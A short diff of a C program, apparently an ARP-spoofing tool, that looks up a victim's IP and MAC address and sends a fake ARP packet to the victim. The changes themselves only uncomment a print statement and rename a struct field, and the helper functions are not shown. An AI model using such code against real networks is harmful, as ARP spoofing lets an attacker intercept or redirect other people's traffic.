@@ -29,7 +29,7 @@ int main()
 	getGateWayAddress(choiceDev, &LanInfo);
 	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
 	getMACAddress(handle, &LanInfo);
-	//printf("victim MAC : ");
+	printf("victim MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
@@ -47,7 +47,7 @@ int main()
 	}
 	/* send fake arp packet */
 	ARP_PACKET arpPacket;
-	arpPacket.ethernet.ether_Type = ntohs(ARP);
+	arpPacket.ethernet.etherType = ntohs(ARP);
 	setArpHeader(&arpPacket.arp);
 	attackvictim(handle, &arpPacket, &LanInfo);
 	Sleep(500);
